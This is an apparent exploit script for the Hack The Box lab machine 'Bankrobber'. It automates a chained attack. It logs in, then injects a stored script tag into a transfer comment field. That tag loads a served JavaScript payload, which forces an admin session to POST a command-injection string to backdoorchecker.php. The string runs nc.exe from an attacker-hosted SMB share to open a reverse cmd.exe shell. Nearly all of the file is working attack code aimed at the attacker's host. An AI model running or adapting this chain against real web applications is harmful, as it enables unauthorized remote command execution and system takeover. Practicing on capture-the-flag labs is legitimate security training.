'''
Bankrobber HTB - 15/02/2024
Command Injection via XSRF

Don't forget put your nc in some folder
And run it as sudo since using impacket-smbserver as root
'''
import requests, argparse, urllib3, http.server, socketserver, os, threading
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', dest='target', help='Target Machine')
parser.add_argument('--user', '-u', dest='user', help='Username for register and login')
parser.add_argument('--pass', '-p', dest='password', help='Password for register and login')
parser.add_argument('--ip', '-ip', dest='ip', help='IP Attacker')
parser.add_argument('--port', '-po', dest='port', help='Port for listening')
args = parser.parse_args()

target = args.target
user = args.user
passw = args.password
ip = args.ip
port = args.port

login_url = f'https://{target}/login.php'
send_url = f'http://{target}/user/transfer.php'
s = requests.Session()

http_proxy = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def login():
    data = f"username={user}&password={passw}&pounds=Submit+Query"
    header = {'Content-type': 'application/x-www-form-urlencoded'}
    r = s.post(login_url, data=data, headers=header, allow_redirects=True, verify=False)
    if 'Transfer E-coin' in r.text:
        print("[+] Success login")
    else:
        print("[-] Invalid Credential, please check again")

def create_shelljs():
    print("[i] Creating Shell.js for reverse shell ...")
    # \\\\{ip}\\folder\\file.exe (Original)
    payload = f"""var xhr = new XMLHttpRequest(); 
        var url = 'http://localhost/admin/backdoorchecker.php'; 
        var params = 'cmd=dir | \\\\\\\{ip}\\\\ishare\\\\nc.exe {ip} {port} -e cmd.exe'; 
        xhr.open('POST', url); 
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
        xhr.withCredentials = true; 
        xhr.send(params)
        """
    with open('shell.js', 'w') as file:
        file.write(payload)
    print("[+] shell.js is created")

def inject_xsrf():
    id_val = s.cookies.get_dict().get('id', None)
    payload = f"<script src=http://{ip}:8000/shell.js></script>"
    data = f"fromId={id_val}&toId=2&amount=10&comment={payload}"
    header = {'Content-type': 'application/x-www-form-urlencoded'}
    r = s.post(send_url, data=data, headers=header, verify=False)
    if 'You\'\re not authorized to view this page' not in r.text:
        print('[+] XSRF INJECTED!\nWait and check your nc ...')
    else:
        print('[-] You\'\re credentials is invalid')


def start_http_server():
    print("[i] Starting HTTPServer ...")
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 8000), Handler) as httpd:
        print("Serving at port 8000")
        httpd.serve_forever()

def start_smbserver():
    print("[i] Starting smbserver ...")
    try:
        nc_location = '/home/ardias/Labs/CTF/HTB/Machines/Bankrobber/netcat' # Change Here
        run = f"sudo impacket-smbserver ishare {nc_location} -smb2support"
        os.system(run)
    except Exception as e:
        print("ERROR: " + e)

def main():
    create_shelljs()
    print(f"[!] Please turn on nc first with listening to {port}")
    login()
    thread_server = threading.Thread(target=start_http_server)
    thread_server.start()
    thread_smbserver = threading.Thread(target=start_smbserver)
    thread_smbserver.start()
    inject_xsrf()
    

if __name__ == "__main__":
    main()